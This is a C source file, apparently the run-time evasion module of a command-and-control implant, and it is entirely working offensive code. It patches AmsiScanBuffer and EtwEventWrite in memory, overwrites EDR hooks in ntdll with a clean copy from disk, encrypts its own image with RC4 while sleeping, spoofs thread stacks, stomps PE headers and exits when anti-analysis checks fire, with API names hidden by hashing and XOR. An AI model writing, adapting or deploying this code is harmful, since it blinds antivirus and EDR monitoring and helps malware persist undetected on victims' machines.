/*
 * evasion_runtime.c — Run-time evasion: AMSI, ETW, ntdll unhook, sleep obfuscation.
 *
 * These patches are applied after agent_init, during the agent's lifetime.
 */
#include "agent.h"
#include "evasion.h"
#include "stack_spoof.h"
#include "pe_stomp.h"
#include "api_resolve.h"
#include "syscalls.h"

#if CONFIG_INDIRECT_SYSCALLS
#include "syscalls.h"
#include "syscalls_wrappers.h"
#endif

/* ─── P/Invoke declarations for evasion ─── */

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

/* SystemFunction032 — undocumented RC4 in advapi32.dll */
typedef struct {
    ULONG Length;
    ULONG MaximumLength;
    PUCHAR Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *pSystemFunction032)(USTRING *data, USTRING *key);


/* ═══════════════════════════════════════════════════════════════════
 *  AMSI PATCH
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_patch_amsi(void) {
    /*
     * Patch AmsiScanBuffer to return E_INVALIDARG immediately.
     *
     * Target: amsi.dll!AmsiScanBuffer
     * x64 patch: mov eax, 0x80070057; ret
     *   Bytes: B8 57 00 07 80 C3
     *
     * All API resolution via PEB walk + DJB2 hashing — no plaintext strings.
     */

    /* Resolve LoadLibraryA via PEB walk to load amsi.dll */
    typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
    pLoadLibraryA fnLoadLib = (pLoadLibraryA)api_resolve(HASH_KERNEL32, HASH_LoadLibraryA);
    if (!fnLoadLib) return TRUE;

    /* Decrypt "amsi.dll" on the stack */
    char amsi_name[] = { 'a'^0x5A, 'm'^0x5A, 's'^0x5A, 'i'^0x5A, '.'^0x5A,
                         'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0 };
    for (int i = 0; amsi_name[i]; i++) amsi_name[i] ^= 0x5A;

    HMODULE hAmsi = fnLoadLib(amsi_name);
    SecureZeroMemory(amsi_name, sizeof(amsi_name));
    if (!hAmsi) return TRUE;  /* AMSI not loaded — nothing to patch */

    /* Resolve AmsiScanBuffer by hash from the loaded amsi module */
    #define HASH_AmsiScanBuffer 0xDC5B6220
    void *pFunc = api_resolve_from_module(hAmsi, HASH_AmsiScanBuffer);
    if (!pFunc) return FALSE;

    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    SIZE_T patchSize = sizeof(patch);
    void *pBase = pFunc;

    /* Use NtProtectVirtualMemory via PEB-resolved hash */
    #define HASH_NtProtectVirtualMemory_RT 0x50E92888
    pNtProtectVirtualMemory NtPVM = (pNtProtectVirtualMemory)
        api_resolve(HASH_NTDLL, HASH_NtProtectVirtualMemory_RT);

    if (NtPVM) {
        NTSTATUS st = NtPVM(GetCurrentProcess(), &pBase, &patchSize,
                            PAGE_EXECUTE_READWRITE, &oldProtect);
        if (!NT_SUCCESS(st)) return FALSE;
    } else {
        if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
            return FALSE;
    }

    memcpy(pFunc, patch, sizeof(patch));

    if (NtPVM)
        NtPVM(GetCurrentProcess(), &pBase, &patchSize, oldProtect, &oldProtect);
    else
        VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    return TRUE;
}


/* ═══════════════════════════════════════════════════════════════════
 *  ETW PATCH
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_patch_etw(void) {
    /*
     * Patch EtwEventWrite to return 0 (SUCCESS) immediately.
     * Prevents CLR ETW events: assembly loads, JIT compilation, etc.
     *
     * x64 patch: xor rax, rax; ret
     *   Bytes: 48 33 C0 C3
     *
     * Resolved via PEB walk — no plaintext "ntdll.dll" or "EtwEventWrite".
     */
    #define HASH_EtwEventWrite 0xB10B5E68
    void *pFunc = api_resolve(HASH_NTDLL, HASH_EtwEventWrite);
    if (!pFunc) return FALSE;

    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
    DWORD oldProtect;

    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    return TRUE;
}


/* ═══════════════════════════════════════════════════════════════════
 *  NTDLL UNHOOK
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_unhook_ntdll(void) {
    /*
     * Restore ntdll.dll .text section from a clean copy on disk.
     *
     * EDRs hook ntdll by overwriting the first bytes of functions with
     * JMP instructions to their monitoring code. We read the original
     * ntdll.dll from C:\Windows\System32\ntdll.dll, map it as SEC_IMAGE,
     * and overwrite the hooked .text section with the clean one.
     *
     * ntdll handle resolved via PEB walk — no plaintext strings.
     */
    /* Get ntdll base from PEB InMemoryOrderModuleList (it's always the 2nd entry) */
    typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
    pGetModuleHandleA fnGMH = (pGetModuleHandleA)api_resolve(HASH_KERNEL32, HASH_GetModuleHandleA);
    if (!fnGMH) return FALSE;
    /* Pass NULL-like obfuscated call: resolve ntdll by hash from PEB */
    /* Actually: ntdll is always loaded; find it via the module hash */
    HMODULE hNtdll = (HMODULE)api_resolve(HASH_NTDLL, 0x00000000);
    /* api_resolve with functionHash 0 won't match — we need the module base.
       Use a different approach: resolve any known ntdll export and get its module. */
    {
        void *anyFunc = api_resolve(HASH_NTDLL, HASH_NtClose);
        if (!anyFunc) return FALSE;
        /* Walk backwards to find module base (PE header) */
        unsigned char *p = (unsigned char *)anyFunc;
        /* Align down to 64K boundary and search for MZ header */
        p = (unsigned char *)((ULONG_PTR)p & ~0xFFFF);
        for (int i = 0; i < 256; i++) {
            if (*(USHORT *)p == IMAGE_DOS_SIGNATURE) {
                hNtdll = (HMODULE)p;
                break;
            }
            p -= 0x10000;
        }
    }
    if (!hNtdll) return FALSE;

    /* Read clean ntdll from disk */
    wchar_t ntdllPath[MAX_PATH];
    GetSystemDirectoryW(ntdllPath, MAX_PATH);
    wcscat(ntdllPath, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    HANDLE hMapping = CreateFileMappingW(hFile, NULL,
                                         PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return FALSE;
    }

    void *pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    /* Parse PE headers of loaded ntdll to find .text section */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE *)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;

    BOOL patched = FALSE;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            DWORD textRVA  = section[i].VirtualAddress;

            void *pHooked   = (BYTE *)hNtdll + textRVA;
            void *pOriginal = (BYTE *)pClean + textRVA;

            /* Make hooked .text writable */
            DWORD oldProtect;
            if (!VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                break;
            }

            /* Overwrite hooked .text with clean bytes */
            memcpy(pHooked, pOriginal, textSize);

            /* Restore protection */
            VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
            patched = TRUE;
            break;
        }
    }

    UnmapViewOfFile(pClean);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return patched;
}


/* ═══════════════════════════════════════════════════════════════════
 *  SLEEP OBFUSCATION (Ekko-style)
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Ekko sleep obfuscation:
 *   1. Get the base and size of the agent's PE image in memory
 *   2. Encrypt the image with RC4 (SystemFunction032)
 *   3. Change memory protection to RW (non-executable)
 *   4. Sleep for the requested duration
 *   5. Change memory back to RX
 *   6. Decrypt with same RC4 key
 *
 * During sleep, the agent's code is encrypted AND non-executable.
 * Memory scanners see encrypted garbage in non-executable pages.
 *
 * This is a simplified version. The full Ekko uses ROP chains via
 * timer callbacks (CreateTimerQueueTimer + NtContinue) to avoid
 * having executable code during the encrypt/sleep/decrypt sequence.
 * That requires precise CONTEXT manipulation — implemented as a
 * future enhancement.
 */

static void _get_module_bounds(void **base, DWORD *size) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hSelf;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE *)hSelf + dos->e_lfanew);
    *base = (void *)hSelf;
    *size = nt->OptionalHeader.SizeOfImage;
}

void evasion_sleep_obfuscated(DWORD milliseconds) {
#if CONFIG_SLEEP_OBFUSCATE
    /* Resolve SystemFunction032 (RC4) from advapi32 via PEB walk */
    #define HASH_SystemFunction032 0xE58C8805
    pSystemFunction032 SystemFunction032 =
        (pSystemFunction032)api_resolve(HASH_ADVAPI32, HASH_SystemFunction032);
    if (!SystemFunction032) {
        Sleep(milliseconds);
        return;
    }

    void *imageBase;
    DWORD imageSize;
    _get_module_bounds(&imageBase, &imageSize);

    /* RC4 key — random per sleep cycle */
    unsigned char rc4Key[16];
    BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    USTRING data = { imageSize, imageSize, (PUCHAR)imageBase };
    USTRING key  = { sizeof(rc4Key), sizeof(rc4Key), rc4Key };

    /* Step 1: Make image RW (so we can encrypt it) */
    DWORD oldProtect;
    VirtualProtect(imageBase, imageSize, PAGE_READWRITE, &oldProtect);

    /* Step 2: Encrypt with RC4 */
    SystemFunction032(&data, &key);

    /* Step 3: Sleep (agent code is encrypted + non-executable) */
    Sleep(milliseconds);

    /* Step 4: Decrypt with same RC4 key (RC4 is symmetric/self-inverting with same key stream) */
    /* Re-init key since RC4 state was consumed. We need a fresh call. */
    /* Actually SystemFunction032 reinitializes from key each call, so same key works. */
    SystemFunction032(&data, &key);

    /* Step 5: Restore RX */
    VirtualProtect(imageBase, imageSize, oldProtect, &oldProtect);

    /* Wipe key */
    SecureZeroMemory(rc4Key, sizeof(rc4Key));
#else
    Sleep(milliseconds);
#endif
}


/* ═══════════════════════════════════════════════════════════════════
 *  THREAD STACK SPOOFING
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Simplified stack spoofing: before sleeping, overwrite the return address
 * on the stack with a benign address (e.g., inside kernel32!BaseThreadInitThunk).
 * Save the real return address, sleep, then restore it.
 *
 * This hides the agent from stack-walking tools that look for suspicious
 * return addresses (e.g., code running from VirtualAlloc'd memory).
 */

BOOL evasion_spoof_stack(void **saved_context) {
#if CONFIG_STACK_SPOOF
    return spoof_thread_stack(saved_context);
#else
    (void)saved_context;
    return FALSE;
#endif
}

void evasion_restore_stack(void *saved_context) {
#if CONFIG_STACK_SPOOF
    spoof_restore_thread_stack(saved_context);
#else
    (void)saved_context;
#endif
}


/* ═══════════════════════════════════════════════════════════════════
 *  MASTER INIT
 * ═══════════════════════════════════════════════════════════════════ */

BOOL evasion_stomp_pe_headers(void) {
#if CONFIG_PE_STOMP
    return pe_stomp_self();
#else
    return TRUE;
#endif
}

BOOL evasion_init(void) {
    /* Load-time: anti-analysis (exits agent if detected) */
    if (!anti_analysis_check())
        return FALSE;

    /* Run-time patches — order matters:
     * 1. Unhook ntdll FIRST (restores clean syscalls for everything else)
     * 2. Patch ETW (prevent logging of subsequent operations)
     * 3. Patch AMSI (prevent scanning of loaded assemblies)
     * 4. Initialize indirect syscalls (after unhook for clean stubs)
     * 5. Initialize stack spoofing gadget cache
     * 6. Stomp PE headers LAST (after all PE-reading init is done)
     */
#if CONFIG_UNHOOK_NTDLL
    evasion_unhook_ntdll();
#endif

#if CONFIG_PATCH_ETW
    evasion_patch_etw();
#endif

#if CONFIG_PATCH_AMSI
    evasion_patch_amsi();
#endif

#if CONFIG_INDIRECT_SYSCALLS
    if (syscall_init() != 0) {
        /* Some syscalls failed to resolve — non-fatal, continue */
    }
    sw_init();
#endif

#if CONFIG_STACK_SPOOF
    spoof_init();
#endif

    /* PE stomp must be LAST — after all code that reads PE headers */
#if CONFIG_PE_STOMP
    evasion_stomp_pe_headers();
#endif

    return TRUE;
}
